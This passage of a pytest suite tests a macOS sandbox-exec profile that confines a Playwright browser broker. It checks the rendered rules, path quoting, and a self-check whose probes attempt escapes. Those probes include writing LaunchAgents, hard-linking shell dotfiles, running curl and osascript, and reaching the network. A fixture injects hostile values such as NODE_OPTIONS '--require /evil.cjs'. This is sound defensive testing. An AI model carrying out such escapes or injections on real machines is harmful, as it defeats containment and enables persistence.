    """Review: npm tarballs have no folder entries, so tarfile makes lib/ with teamd's umask."""
    files = dict(PW_FILES, **{"package/lib/deep/util.js": b"x"})
    tarball = npm_tarball(files)
    base = commit_lockfile(env["repo"], {"version": "1.55.0", "integrity": sri(tarball)})
    lane.broker_root()                                                  # made before the umask changes
    old = os.umask(0o002)
    try:
        dest = lane.pinned_playwright(env["repo"], base, Registry(tarball))
    finally:
        os.umask(old)
    for folder in (dest, dest / "lib", dest / "lib" / "deep"):
        assert stat_mode(os.lstat(folder)) == 0o755
    assert lane.pinned_playwright(env["repo"], base, Registry(tarball)) == dest


@pytest.mark.parametrize("which", ["STAMP", "STAMP_MANIFEST"])
def test_a_stamp_that_is_a_symlink_is_refused(env, unpack, which):
    tarball = npm_tarball(PW_FILES)
    base = commit_lockfile(env["repo"], {"version": "1.55.0", "integrity": sri(tarball)})
    dest = lane.pinned_playwright(env["repo"], base, Registry(tarball))
    stamp = dest / getattr(lane, which)
    copy = env["tmp"] / "copy"
    copy.write_text(stamp.read_text())
    stamp.unlink()
    os.symlink(copy, stamp)
    with pytest.raises(lane.LaneRefused, match="isn't a plain file"):
        lane.pinned_playwright(env["repo"], base, Registry(tarball))


def test_the_broker_root_must_be_a_real_folder_outside_the_shared_temp_folders(env, monkeypatch):
    real = lane.broker_root()
    shutil.rmtree(real)
    elsewhere = env["tmp"] / "elsewhere"
    elsewhere.mkdir()
    os.symlink(elsewhere, real)
    with pytest.raises(lane.LaneRefused, match="isn't a plain folder"):
        lane.broker_root()
    real.unlink()
    monkeypatch.setattr(lane, "UNSAFE_ROOTS", (str(env["tmp"]),))
    with pytest.raises(lane.LaneRefused, match="under the shared temp folder"):
        lane.broker_root()
    monkeypatch.undo()


def test_an_oserror_inside_the_install_lock_keeps_its_own_message(env):
    with pytest.raises(OSError, match="boom"):
        with lane.install_lock():
            raise OSError(5, "boom")
    with lane.install_lock():                                           # and the lock is usable again
        pass


# ---------- Task 6: the broker's profile ----------

# Spec unit test 9: every rule of the checked-in template, byte for byte. Changing the template means changing this
# list, in a diff a reviewer sees. The last four are the template's own allowances from spike 5.
TEMPLATE_RULES = [
    '(version 1)',
    '(deny default)',
    '(import "system.sb")',
    '(allow file-read* file-write* (subpath "{{B_DIR}}"))',
    '(allow file-read* (subpath "{{PLAYWRIGHT_DIR}}") (subpath "{{BROWSERS_DIR}}"))',
    '(allow file-read* (subpath "{{NODE_PREFIX}}"))',
    '(allow process-fork)',
    '(allow process-exec (literal "{{NODE_BIN}}") (subpath "{{SHELL_DIR}}"))',
    '(allow file-read-metadata {{ANCESTORS}})',
    '(allow network-outbound {{LANE_PORTS}})',
    '(allow network-bind network-inbound (local ip "localhost:{{BROKER_PORT}}"))',
    '(allow file-read* (subpath "/opt/homebrew/Cellar") (subpath "/opt/homebrew/opt") (subpath "/usr/local/Cellar") (subpath "/usr/local/opt"))',
    '(allow iokit-open-user-client (iokit-user-client-class "RootDomainUserClient"))',
    '(allow mach-register (global-name-regex #"^org\\.chromium\\.Chromium\\.MachPortRendezvousServer\\.[0-9]+$"))',
    '(allow mach-lookup (global-name-regex #"^org\\.chromium\\.Chromium\\.MachPortRendezvousServer\\.[0-9]+$"))',
]
RENDEZVOUS = TEMPLATE_RULES[-2:]
PATTERN_RULE = re.compile(r"\((?:[\w-]+-)?(?:prefix|regex)\b")
ALLOW_FILE = Path(__file__).resolve().parent.parent / "scripts" / "lane_broker_allow.sb"


def rules(text):
    return [line for line in text.splitlines() if line.strip() and not line.lstrip().startswith(";")]


def test_the_template_is_exactly_the_reviewed_rules():
    """Spec unit test 9: the template, as an allowlist."""
    template = (teamlib.package_dir() / "lane" / "broker.sb.tmpl").read_text()
    assert rules(template) == TEMPLATE_RULES
    assert TEMPLATE_RULES[-4:] == rules(ALLOW_FILE.read_text())         # the reviewed file itself, not a hand copy
    assert [r for r in rules(template) if PATTERN_RULE.search(r)] == RENDEZVOUS


@pytest.fixture
def profile_paths(env, tmp_root):
    broker = env["home"] / ".superyak" / "team" / "broker"
    pw = broker / "playwright-core-1.55.0"
    shell = broker / "browsers" / "chromium_headless_shell-1243"
    node = Path("/opt/lane-test-node/22.9.0/bin/node")                  # only named, never run
    for folder in (pw, shell):
        folder.mkdir(parents=True)
    b = lane.ensure_lane("t1", "kaylee") / "b"
    return {"b": b, "b_text": lane.lane_text(b), "pw": pw, "browsers": broker / "browsers", "shell": shell, "node": node}


def render(paths, base=41000):
    return lane.render_profile(paths["b_text"], paths["pw"], paths["browsers"], paths["shell"], paths["node"], base)


def test_the_profile_denies_by_default_with_one_rule_per_lane_port(profile_paths):
    """Spec unit test 9, in spike 5's proven form: `remote ip` for every lane port but the broker's own, which gets
    bind and inbound only."""
    text = render(profile_paths, 41032)
    assert rules(text)[:2] == ["(version 1)", "(deny default)"]          # SBPL needs (version 1) first
    assert not any("(allow default)" in r or "appleevent-send" in r for r in rules(text)) and "{{" not in text
    ports = re.findall(r'\(remote ip "localhost:(\d+)"\)', text)
    assert ports == [str(p) for p in range(41032, 41063)] and len(ports) == 31 and "41063" not in ports
    assert len([r for r in rules(text) if r.startswith("(allow network-outbound")]) == 1
    assert '(allow network-bind network-inbound (local ip "localhost:41063"))' in rules(text)
    assert "(allow process-fork)" in rules(text)
    assert [r for r in rules(text) if PATTERN_RULE.search(r)] == RENDEZVOUS
    assert "link_dotfile" in lane.SELF_CHECK_PROBES
    assert not any("remote tcp" in r or "localhost:*" in r for r in rules(text))


def test_under_home_the_profile_only_reads_the_pinned_folders(profile_paths, env):
    """Spec unit test 9: under $HOME, read access to the pinned Playwright and browsers folders, exec of the headless
    shell's folder, and file-read-metadata literals of their exact ancestors; nothing else. No subpath is $HOME or
    a folder above it."""
    home = str(env["home"])
    text = render(profile_paths)
    found = set()
    for rule in rules(text):
        operations = rule[len("(allow "):].split(" (")[0]
        for kind, path in re.findall(r'\((subpath|literal) "([^"]*)"\)', rule):
            if path == home or path.startswith(home + "/"):
                found.add((operations, kind, path))
    broker = home + "/.superyak/team/broker"
    assert found == {
        ("file-read*", "subpath", broker + "/playwright-core-1.55.0"),
        ("file-read*", "subpath", broker + "/browsers"),
        ("process-exec", "subpath", broker + "/browsers/chromium_headless_shell-1243"),
        ("file-read-metadata", "literal", home), ("file-read-metadata", "literal", home + "/.superyak"),
        ("file-read-metadata", "literal", home + "/.superyak/team"), ("file-read-metadata", "literal", broker),
        ("file-read-metadata", "literal", broker + "/browsers"),
    }
    above = {home} | {str(p) for p in Path(home).parents}
    assert not [path for path in re.findall(r'\(subpath "([^"]*)"\)', text) if path in above]


def test_the_broker_folder_and_node_are_filled_in(profile_paths):
    text = render(profile_paths)
    b = profile_paths["b_text"]
    assert b == os.path.realpath(profile_paths["b"])
    assert '(allow file-read* file-write* (subpath "%s"))' % b in text
    assert '(allow process-exec (literal "%s")' % os.path.realpath(profile_paths["node"]) in text
    assert '(allow file-read* (subpath "%s"))' % os.path.realpath(profile_paths["node"].parents[1]) in text
    for ancestor in Path(b).parents:
        assert '(literal "%s")' % ancestor in text
    write_rules = [r for r in rules(text) if "file-write" in r]
    assert write_rules == ['(allow file-read* file-write* (subpath "%s"))' % b]


def test_a_profile_never_names_the_target_of_a_planted_link(profile_paths, env):
    """Review: b/ swapped for a link to $HOME can't become a writable subpath: lane_text refuses it."""
    b = profile_paths["b"]
    b.rmdir()
    os.symlink(env["home"], b)
    with pytest.raises(lane.LaneRefused, match="unsafe lane"):
        lane.lane_text(b)


@pytest.mark.parametrize("where", ["root", "home", "above home", "/Users", "/Volumes", "/private", "/private/tmp",
                                   "/private/var/folders"])
def test_a_node_prefix_that_reads_too_much_is_refused(env, where):
    """Review: the broker reads node's prefix (of the resolved binary) whole, so /, /private, $HOME and above, and
    anything under /Users, /Volumes, /private/tmp or /private/var/folders are out."""
    home = Path(os.path.realpath(env["home"]))
    node = {"root": Path("/nodebin/node"), "home": home / "bin" / "node", "above home": home.parent / "bin" / "node",
            "/Users": Path("/Users/me/node/bin/node"), "/Volumes": Path("/Volumes/usb/node/bin/node"),
            "/private": Path("/private/bin/node"), "/private/tmp": Path("/private/tmp/node/bin/node"),
            "/private/var/folders": Path("/private/var/folders/xy/T/node/bin/node")}[where]
    with pytest.raises(lane.LaneRefused, match="too wide"):
        lane.node_prefix(node)
    link = env["tmp"] / "opt" / "node" / "bin" / "node"                  # a tidy-looking link to a too-wide one
    link.parent.mkdir(parents=True)
    os.symlink(node, link)
    with pytest.raises(lane.LaneRefused, match="too wide"):
        lane.node_prefix(link)
    assert lane.node_prefix(Path("/opt/homebrew/Cellar/node/22.9.0/bin/node")) == Path("/opt/homebrew/Cellar/node/22.9.0")


@pytest.mark.parametrize("bad", ['quo"te', "back\\slash"])
def test_paths_a_profile_cannot_quote_are_refused(profile_paths, env, bad):
    """Spec unit test 9."""
    odd = env["home"] / ".superyak" / "team" / "broker" / ("playwright-core-" + bad)
    odd.mkdir(parents=True)
    with pytest.raises(lane.LaneRefused, match="can't quote"):
        lane.render_profile(profile_paths["b_text"], odd, profile_paths["browsers"], profile_paths["shell"],
                            profile_paths["node"], 41000)


@pytest.fixture
def probe_world(env, monkeypatch):
    """What the self-check's probes act on, made to exist here: dotfiles, LaunchAgents, Claude's tmp, /Users/Shared,
    the user temp folder, and the programs (any real file stands in)."""
    (env["home"] / ".zshrc").write_text("export X=1\n")
    (env["home"] / "Library" / "LaunchAgents").mkdir(parents=True)
    private_tmp, shared, user_temp = env["tmp"] / "private-tmp", env["tmp"] / "Shared", env["tmp"] / "T"
    for folder in (private_tmp / ("claude-%d" % os.getuid()), shared, user_temp):
        folder.mkdir(parents=True)
    monkeypatch.setattr(lane, "PRIVATE_TMP", private_tmp)
    monkeypatch.setattr(lane, "USERS_SHARED", shared)
    monkeypatch.setattr(lane, "PROBE_PROGRAMS", {name: sys.executable for name in lane.PROBE_PROGRAMS})
    calculator = env["tmp"] / "Calculator.app"
    calculator.mkdir()
    monkeypatch.setattr(lane, "CALCULATOR_APP", calculator)
    monkeypatch.setattr(lane, "network_up", lambda: True)
    return {"user_temp": user_temp}


def test_the_self_check_judges_every_probe_and_cleans_up(profile_paths, probe_world, env, monkeypatch):
    """Acceptance step 1's logic, with a fake sandbox-exec: every probe must be refused, the three positive controls
    (exec_node among them) must succeed, the profile and the probe go inline, each probe gets its target's exact
    path, and whatever a probe created is removed with the scratch lane."""
    monkeypatch.setattr(lane, "port_free", lambda port: True)
    seen = []

    def sandbox(cmd, env=None, cwd=None, **kw):
        seen.append((cmd, env))
        name = cmd[-1]
        if name == "write_home":
            (Path(env["HOME"]) / "superyak-lane-probe.txt").write_text("x")       # a probe that got through
            return Ran(0, "succeeded")
        positive = name in lane.SELF_CHECK_POSITIVE
        return Ran(0 if positive else 1, "succeeded" if positive else "refused: EPERM")
    monkeypatch.setattr(lane, "_run", lambda cmd, timeout=60: Ran(0, str(probe_world["user_temp"]) + "\n"))
    rows = lane.self_check(profile_paths["node"], profile_paths["pw"], profile_paths["shell"], run=sandbox)
    verdicts = {name: verdict for name, verdict, _ in rows}
    assert set(verdicts) == set(lane.SELF_CHECK_PROBES) | set(lane.SELF_CHECK_POSITIVE) | {"leftover"}
    assert len(lane.SELF_CHECK_PROBES) == 17 and "exec_open_calculator" in lane.SELF_CHECK_PROBES
    assert lane.SELF_CHECK_POSITIVE == ("lane_port", "write_own_folder", "exec_node")
    assert verdicts["write_home"] == "FAIL" and verdicts["leftover"] == "FAIL"
    assert all(v == "PASS" for name, v in verdicts.items() if name not in ("write_home", "leftover"))
    assert not (env["home"] / "superyak-lane-probe.txt").exists()
    cmd, probe_env = seen[0]
    assert cmd[:2] == [lane.SANDBOX_EXEC, "-p"] and cmd[2].startswith(";") and "(deny default)" in cmd[2]
    assert cmd[3:5] == [str(profile_paths["node"]), "-e"] and "const probes" in cmd[5]
    assert set(probe_env) == {"PATH", "HOME", "TMPDIR", "PROBE_CANARY_PORT", "PROBE_LANE_PORT", "PROBE_CLAUDE_TMP",
                              "PROBE_USER_TEMP", "PROBE_DOTFILE", "PROBE_LINK_DOTFILE", "PROBE_RC", "PROBE_LAUNCHAGENTS",
                              "PROBE_USERS_SHARED"}
    zshrc = os.path.realpath(env["home"] / ".zshrc")
    assert probe_env["PROBE_DOTFILE"] == probe_env["PROBE_RC"] == probe_env["PROBE_LINK_DOTFILE"] == zshrc
    team_id = "superyak-self-check-%d" % os.getpid()
    assert not lane.lane_path(team_id, "check").exists() and lane.block_of(team_id, "check") is None
    assert not lane._team_lock(team_id).exists()


def test_a_probe_whose_target_is_missing_is_broken_not_passed(profile_paths, probe_world, env, monkeypatch):
    """Review (N7): ENOENT is no refusal. With no rc file, no dotfile and no LaunchAgents folder, those probes don't
    run at all, and nothing is created for them."""
    monkeypatch.setattr(lane, "port_free", lambda port: True)
    (env["home"] / ".zshrc").unlink()
    (env["home"] / "Library" / "LaunchAgents").rmdir()
    ran = []

    def sandbox(cmd, env=None, cwd=None, **kw):
        ran.append(cmd[-1])
        return Ran(0 if cmd[-1] in lane.SELF_CHECK_POSITIVE else 1, "refused: EPERM")
    monkeypatch.setattr(lane, "_run", lambda cmd, timeout=60: Ran(0, str(probe_world["user_temp"]) + "\n"))
    verdicts = {name: verdict for name, verdict, _ in
                lane.self_check(profile_paths["node"], profile_paths["pw"], profile_paths["shell"], run=sandbox)}
    for name in ("read_dotfile", "open_rc_for_write", "write_launchagents"):
        assert verdicts[name] == "BROKEN" and name not in ran
    assert not (env["home"] / ".zshrc").exists() and not (env["home"] / "Library" / "LaunchAgents").exists()


# ---------- Task 6, fix round 1 ----------

PROBE_JS = Path(lane.__file__).resolve().parent / "lane" / "profile_probe.js"


def run_probe_js(name, tmp_path, **extra):
    node = shutil.which("node")
    if node is None:
        pytest.skip("node")
    env = {"PATH": os.environ["PATH"], "HOME": str(tmp_path), "TMPDIR": str(tmp_path)}
    env.update(extra)
    args = [node, "-e", PROBE_JS.read_text()] + ([name] if name is not None else [])
    return subprocess.run(args, env=env, capture_output=True, text=True, timeout=60)


def test_the_probe_script_runs_for_real_and_never_reads_a_mistake_as_a_refusal(tmp_path):
    r = run_probe_js("no_such_probe", tmp_path)
    assert r.returncode == 2 and not r.stdout.startswith("refused")
    assert run_probe_js(None, tmp_path).returncode == 2
    r = run_probe_js("exec_node", tmp_path)
    assert (r.returncode, r.stdout.strip()) == (0, "succeeded")
    r = run_probe_js("write_own_folder", tmp_path)
    assert r.returncode == 0 and (tmp_path / "superyak-lane-probe").exists()
    r = run_probe_js("open_rc_for_write", tmp_path, PROBE_RC=str(tmp_path / "missing-rc"))
    assert (r.returncode, r.stdout.split()[:2]) == (1, ["refused:", "ENOENT"])
    for name, extra in (("read_dotfile", {}), ("open_rc_for_write", {}), ("link_dotfile", {}), ("net_canary", {}),
                        ("net_canary", {"PROBE_CANARY_PORT": "x"}), ("lane_port", {"PROBE_LANE_PORT": "99999"}),
                        ("read_user_temp", {})):
        r = run_probe_js(name, tmp_path, **extra)
        assert r.returncode == 2 and not r.stdout.startswith("refused"), name


def test_the_probe_scripts_probes_are_the_self_checks(tmp_path):
    keys = re.findall(r"^  (\w+): \(\) =>", PROBE_JS.read_text(), re.M)
    assert sorted(keys) == sorted(lane.SELF_CHECK_PROBES + lane.SELF_CHECK_POSITIVE) and len(set(keys)) == len(keys)


def test_the_link_probe_succeeds_when_the_link_is_made_and_always_removes_it(tmp_path):
    """Review: the link itself is the bypass (same-uid sandboxes can write the lane), whatever a read through it does."""
    rc = tmp_path / "rc"
    rc.write_text("x")
    rc.chmod(0)                                                         # a read through the link would fail
    try:
        r = run_probe_js("link_dotfile", tmp_path, PROBE_LINK_DOTFILE=str(rc))
        assert (r.returncode, r.stdout.strip()) == (0, "succeeded")
        assert os.stat(rc).st_nlink == 1 and not (tmp_path / "superyak-lane-probe-link").exists()
    finally:
        rc.chmod(0o600)
    r = run_probe_js("link_dotfile", tmp_path, PROBE_LINK_DOTFILE=str(tmp_path / "missing"))
    assert (r.returncode, r.stdout.split()[:2]) == (1, ["refused:", "ENOENT"])


@pytest.fixture(autouse=True)
def hermetic_network(monkeypatch):
    """A test that wants the network check patches it; none may reach the real network by accident."""
    def no_network():
        raise AssertionError("lane.network_up ran for real; patch it")
    monkeypatch.setattr(lane, "network_up", no_network)


def test_the_link_probe_needs_a_regular_dotfile_on_the_lanes_device(probe_world, env, monkeypatch):
    lane_dir = env["tmp"] / "lane"
    lane_dir.mkdir()
    assert lane.probe_targets(None, lane_dir)["link_dotfile"] == ("PROBE_LINK_DOTFILE", env["home"] / ".zshrc")
    device = lane._device
    monkeypatch.setattr(lane, "_device", lambda path: 1 if Path(path) == lane_dir else 2)       # another volume: EXDEV
    assert lane.probe_targets(None, lane_dir)["link_dotfile"][1] is None
    assert lane.probe_targets(None, lane_dir)["read_dotfile"][1] == env["home"] / ".zshrc"
    monkeypatch.setattr(lane, "_device", device)
    real = env["tmp"] / "store-rc"
    real.write_text("x")
    (env["home"] / ".zshrc").unlink()
    (env["home"] / ".zshrc").symlink_to(real)                           # a link into somewhere else: EXDEV or worse
    assert lane.probe_targets(None, lane_dir)["link_dotfile"][1] is None


@pytest.mark.parametrize("name, rc, out, verdict", [
    ("exec_osascript", 1, "refused: EPERM", "PASS"), ("exec_osascript", 1, "refused: EACCES (x)", "PASS"),
    ("read_dotfile", 1, "refused: EPERM", "PASS"), ("link_dotfile", 1, "refused: EPERM", "PASS"),
    ("open_rc_for_write", 1, "refused: EACCES", "PASS"), ("write_home", 1, "refused: EPERM", "PASS"),
    ("net_domain", 1, "refused: ENOTFOUND", "PASS"), ("net_domain", 1, "refused: EAI_FAIL", "PASS"),
    ("net_domain", 1, "refused: EAI_AGAIN", "PASS"), ("net_domain", 1, "refused: EPERM", "PASS"),
    ("net_domain", 1, "refused: EACCES", "PASS"), ("net_domain", 1, "refused: 23 (timeout)", "BROKEN"),
    ("net_domain", 1, "refused: ECONNREFUSED", "BROKEN"), ("net_ip", 1, "refused: EAI_FAIL", "BROKEN"), ("net_ip", 1, "refused: EPERM", "PASS"),
    ("exec_osascript", -9, "", "BROKEN"), ("exec_osascript", 64, "", "BROKEN"),
    ("exec_osascript", 2, "broken: unknown probe", "BROKEN"), ("exec_osascript", 1, "", "BROKEN"),
    ("exec_osascript", 1, "TypeError: x", "BROKEN"), ("exec_osascript", 1, "refused: ETIMEDOUT", "BROKEN"),
    ("read_dotfile", 1, "refused: ENOENT", "BROKEN"), ("net_ip", 1, "refused: ENOTFOUND", "BROKEN"),
    ("net_canary", 1, "refused: ECONNREFUSED", "BROKEN"), ("exec_osascript", 1, "refused: nocode (Command failed)", "BROKEN"),
    ("exec_osascript", 0, "succeeded", "FAIL"), ("write_home", 0, "succeeded", "FAIL"),
    ("exec_node", 0, "succeeded", "PASS"), ("lane_port", 0, "succeeded", "PASS"),
    ("exec_node", 1, "refused: EPERM", "FAIL"), ("exec_node", -9, "", "BROKEN"), ("exec_node", 2, "broken: x", "BROKEN"),
])
def test_a_probe_passes_only_on_a_real_refusal(name, rc, out, verdict):
    assert lane.judge_probe(name, rc, out) == verdict


@pytest.mark.parametrize("bad", ["{{LANE_PORTS}}", "a{b", "a}b", "a\nb", "a\x01b", "a\x7fb"])
def test_a_path_that_could_reopen_a_placeholder_or_a_line_is_refused(profile_paths, env, bad):
    odd = env["home"] / ".superyak" / "team" / "broker" / ("playwright-core-" + bad)
    with pytest.raises(lane.LaneRefused, match="can't quote"):
        lane.render_profile(profile_paths["b_text"], odd, profile_paths["browsers"], profile_paths["shell"],
                            profile_paths["node"], 41000)


def test_a_nul_in_a_path_is_refused_not_raised(profile_paths, env):
    with pytest.raises(lane.LaneRefused):
        lane.render_profile(profile_paths["b_text"], "/opt/x/pw\x00y", profile_paths["browsers"], profile_paths["shell"],
                            profile_paths["node"], 41000)
    with pytest.raises(lane.LaneRefused):
        lane.sb_quote("/opt/x\x00y")


def test_every_rendered_rule_is_its_template_rule_with_only_values_filled_in(profile_paths):
    safe = r'[^"\\{}\x00-\x1f]*'
    fill = {"ANCESTORS": r'\(literal "%s"\)(?: \(literal "%s"\))*' % (safe, safe),
            "LANE_PORTS": r'\(remote ip "localhost:[0-9]+"\)(?: \(remote ip "localhost:[0-9]+"\))*'}
    template = rules(lane.TEMPLATE.read_text())
    rendered = rules(render(profile_paths))
    assert len(rendered) == len(template)
    for line, pattern in zip(rendered, template):
        regex = re.sub(r"\\\{\\\{([A-Z_]+)\\\}\\\}", lambda m: fill.get(m.group(1), safe), re.escape(pattern))
        assert re.fullmatch(regex, line), (line, pattern)
    assert [r for r in rules(render(profile_paths)) if PATTERN_RULE.search(r)] == RENDEZVOUS


@pytest.mark.parametrize("node", [
    "/private/var/bin/node", "/System/Volumes/Data/Users/me/node/bin/node", "/System/Volumes/Data/opt/node/bin/node",
    "/System/Volumes/x/bin/node", "/Users/node/bin/node", "/private/tmp/bin/node", "/Volumes/node/bin/node"])
def test_a_node_prefix_that_holds_or_sits_in_a_shared_area_is_refused(env, node):
    with pytest.raises(lane.LaneRefused, match="too wide"):
        lane.node_prefix(Path(node))


@pytest.mark.parametrize("node", ["/opt/homebrew/Cellar/node/22.9.0/bin/node", "/usr/local/Cellar/node/22.9.0/bin/node",
                                  "/opt/node/bin/node", "/usr/local/node/bin/node"])
def test_homebrew_style_node_prefixes_stay_allowed(env, node):
    assert lane.node_prefix(Path(node)) == Path(node).parents[1]


def _self_check(profile_paths, sandbox):
    return lane.self_check(profile_paths["node"], profile_paths["pw"], profile_paths["shell"], run=sandbox)


@pytest.fixture
def refusing(monkeypatch, probe_world):
    monkeypatch.setattr(lane, "port_free", lambda port: True)
    monkeypatch.setattr(lane, "_run", lambda cmd, timeout=60: Ran(0, str(probe_world["user_temp"]) + "\n"))
    ran = []

    def sandbox(cmd, env=None, cwd=None, **kw):
        ran.append(cmd[-1])
        return Ran(0 if cmd[-1] in lane.SELF_CHECK_POSITIVE else 1, "succeeded" if cmd[-1] in lane.SELF_CHECK_POSITIVE
                   else "refused: EPERM")
    sandbox.ran = ran
    return sandbox


def test_a_target_that_exists_but_cant_be_used_is_broken(profile_paths, refusing, env, monkeypatch):
    """Review: ENOENT is not the only way to refuse for the wrong reason. An unreadable rc file, an unwritable
    /Users/Shared, no Calculator and no network all make a refusal prove nothing."""
    (env["home"] / ".zshrc").chmod(0)
    lane.USERS_SHARED.chmod(0o500)
    monkeypatch.setattr(lane, "CALCULATOR_APP", env["tmp"] / "no-Calculator.app")
    monkeypatch.setattr(lane, "network_up", lambda: False)
    try:
        verdicts = {n: v for n, v, _ in _self_check(profile_paths, refusing)}
    finally:
        lane.USERS_SHARED.chmod(0o700)
        (env["home"] / ".zshrc").chmod(0o600)
    broken = {"read_dotfile", "link_dotfile", "open_rc_for_write", "write_users_shared", "exec_open_calculator",
              "exec_curl", "net_domain", "net_ip"}
    assert {n for n, v in verdicts.items() if v == "BROKEN"} == broken and not broken & set(refusing.ran)
    assert verdicts["write_home"] == verdicts["exec_node"] == "PASS"


def test_a_leftover_that_was_there_before_is_reported_and_kept(profile_paths, refusing, env):
    old = env["home"] / "superyak-lane-probe.txt"
    old.write_text("mine")
    verdicts = {n: v for n, v, _ in _self_check(profile_paths, refusing)}
    assert verdicts["leftover"] == "BROKEN" and verdicts["write_home"] == "BROKEN" and "write_home" not in refusing.ran
    assert old.read_text() == "mine"


def test_one_cleanup_step_failing_does_not_skip_the_rest(profile_paths, refusing, monkeypatch):
    def boom(path):
        raise OSError(5, "boom")
    monkeypatch.setattr(lane, "remove_lane", boom)
    rows = _self_check(profile_paths, refusing)
    team_id = "superyak-self-check-%d" % os.getpid()
    assert lane.block_of(team_id, "check") is None and not lane._team_lock(team_id).exists()
    assert any(n == "cleanup" and v == "BROKEN" for n, v, _ in rows)
    shutil.rmtree(lane.lane_path(team_id, "check"), ignore_errors=True)


def test_a_probe_that_hangs_or_cant_start_costs_one_row_not_all(profile_paths, refusing):
    def sandbox(cmd, **kw):
        if cmd[-1] == "exec_curl":
            raise subprocess.TimeoutExpired(cmd, 60)
        if cmd[-1] == "net_ip":
            raise OSError(2, "no sandbox-exec")
        return refusing(cmd, **kw)
    verdicts = {n: v for n, v, _ in _self_check(profile_paths, sandbox)}
    assert verdicts["exec_curl"] == verdicts["net_ip"] == "BROKEN" and verdicts["write_home"] == "PASS"
    assert len(verdicts) == len(lane.SELF_CHECK_PROBES) + len(lane.SELF_CHECK_POSITIVE)


def test_the_link_probe_gets_the_dotfile_and_its_lane(profile_paths, refusing, env):
    seen = {}

    def sandbox(cmd, env=None, cwd=None, **kw):
        seen[cmd[-1]] = (env, cwd)
        return refusing(cmd, env=env, cwd=cwd)
    _self_check(profile_paths, sandbox)
    e, cwd = seen["link_dotfile"]
    assert e["PROBE_LINK_DOTFILE"] == os.path.realpath(env["home"] / ".zshrc") and e["TMPDIR"] == cwd


def test_one_leftover_that_cant_be_removed_does_not_hide_the_next(profile_paths, refusing, env, monkeypatch):
    (env["home"] / "Library" / "LaunchAgents").mkdir(parents=True, exist_ok=True)

    def sandbox(cmd, env=None, cwd=None, **kw):
        if cmd[-1] in ("write_home", "write_launchagents"):
            for target in lane._probe_leftovers().values():
                if cmd[-1] == "write_home" and target.name.endswith(".txt") or \
                        cmd[-1] == "write_launchagents" and target.name.endswith(".plist"):
                    target.write_text("x")
            return Ran(0, "succeeded")
        return refusing(cmd, env=env, cwd=cwd)
    real = os.unlink

    def unlink(target, *a, **kw):
        if str(target).endswith("superyak-lane-probe.txt"):
            raise OSError(1, "nope")
        return real(target, *a, **kw)
    monkeypatch.setattr(lane.os, "unlink", unlink)
    rows = _self_check(profile_paths, sandbox)
    monkeypatch.undo()
    assert not (env["home"] / "Library/LaunchAgents/superyak-lane-probe.plist").exists()
    assert any(n == "leftover" and "plist" in d for n, _, d in rows) and any(n == "cleanup" for n, _, _ in rows)
    (env["home"] / "superyak-lane-probe.txt").unlink()


# ---------- Task 7: the broker, process cleanup, diagnostics and the secret ----------

NODE = shutil.which("node")
# Linux stand-in for sandbox-exec: record the inline profile ("-p <profile>") in a file of the test's, then run the
# rest (without the PWD the shell adds). The broker's environment is built from nothing, so the path is in the script.
FAKE_SANDBOX_EXEC = '#!/bin/sh\nprintf %%s "$2" > \'%s\'\nshift 2\nexec /usr/bin/env -u PWD "$@"\n'
# A stand-in for playwright-core: launchServer listens where it is told, records what it was given, and starts a
# child DETACHED, in its own process group, as Playwright starts Chrome (processLauncher: detached on every platform
# but Windows); server.process() is that child. A FAIL file makes it fail the way Playwright does, quoting the
# endpoint, secret and all.
FAKE_PLAYWRIGHT = r"""
const net = require('net'), fs = require('fs'), path = require('path'), { spawn } = require('child_process');
exports.chromium = { launchServer: async (o) => {
  const out = process.env.TMPDIR;
  fs.writeFileSync(path.join(out, 'env.json'), JSON.stringify(Object.keys(process.env).sort()));
  fs.writeFileSync(path.join(out, 'options.json'), JSON.stringify(o));
  if (fs.existsSync(path.join(__dirname, 'FAIL_AFTER_SPAWN'))) {   // a child (cwd = b/) is left behind
    const orphan = spawn('sleep', ['300'], { stdio: 'ignore', detached: true });
    fs.writeFileSync(path.join(out, 'child.pid'), String(orphan.pid));
  }
  const failFile = path.join(__dirname, 'FAIL');
  if (fs.existsSync(failFile) || fs.existsSync(path.join(__dirname, 'FAIL_AFTER_SPAWN'))) {
    const pad = fs.existsSync(failFile) ? 'z'.repeat(Number(fs.readFileSync(failFile, 'utf8') || 0)) : '';
    throw new Error('launchServer failed at ' + pad + 'ws://' + o.host + ':' + o.port + o.wsPath);
  }
  const child = spawn('sleep', ['300'], { stdio: 'ignore', detached: true });
  fs.writeFileSync(path.join(out, 'child.pid'), String(child.pid));
  const srv = net.createServer().listen(o.port, o.host);
  await new Promise(resolve => srv.on('listening', resolve));
  const stubborn = fs.existsSync(path.join(__dirname, 'STUBBORN'));   // a browser that ignores the close
  return { wsEndpoint: () => 'ws://' + o.host + ':' + o.port + o.wsPath, process: () => child,
           close: () => stubborn ? new Promise(() => {}) : new Promise(r => { child.kill(); srv.close(r); }) };
} };
"""


@pytest.fixture
def broker_parts(env, tmp_root, held, monkeypatch):
    if not NODE:
        pytest.skip("needs node")
    fake = env["tmp"] / "sandbox-exec"
    fake.write_text(FAKE_SANDBOX_EXEC % (env["tmp"] / "profile.sb"))
    fake.chmod(0o755)
    monkeypatch.setattr(lane, "SANDBOX_EXEC", str(fake))
    monkeypatch.setattr(lane, "KILL_GRACE_S", 1)
    pw = env["tmp"] / "playwright-core-1.55.0"
    pw.mkdir()
    (pw / "index.js").write_text(FAKE_PLAYWRIGHT)
    shell = lane.browsers_root() / "chromium_headless_shell-1243"
    shell.mkdir()
    for name, value in (("NODE_OPTIONS", "--require /evil.cjs"), ("PW_TEST_CONNECT_WS_ENDPOINT", "ws://evil"),
                        ("PLAYWRIGHT_BROWSERS_PATH", "/Users/me/Library/Caches/ms-playwright")):
        monkeypatch.setenv(name, value)
    held("t1")
    path = lane.ensure_lane("t1", "kaylee")
    base = lane.allocate_block("t1", "kaylee")
    stderr = teamlib.team_dir("t1") / "workers" / "kaylee" / "broker-stderr.log"
    return {"path": path, "base": base, "node": Path(os.path.realpath(NODE)), "pw": pw, "shell": shell,
            "stderr": stderr, "profile": env["tmp"] / "profile.sb"}


def start(parts):
    return lane.start_broker(parts["path"], parts["base"], parts["node"], parts["pw"], parts["shell"], parts["stderr"])


def running(pid):
    """The tests' own liveness check (T7: never lane._alive, the code under test): a zombie counts as gone."""
    try:
        os.kill(pid, 0)
    except ProcessLookupError:
        return False
    except PermissionError:
        return True
    r = subprocess.run(["ps", "-o", "stat=", "-p", str(pid)], capture_output=True, text=True)
    return r.returncode == 0 and not r.stdout.strip().startswith("Z")


def gone(pid, timeout=5):
    end = time.time() + timeout
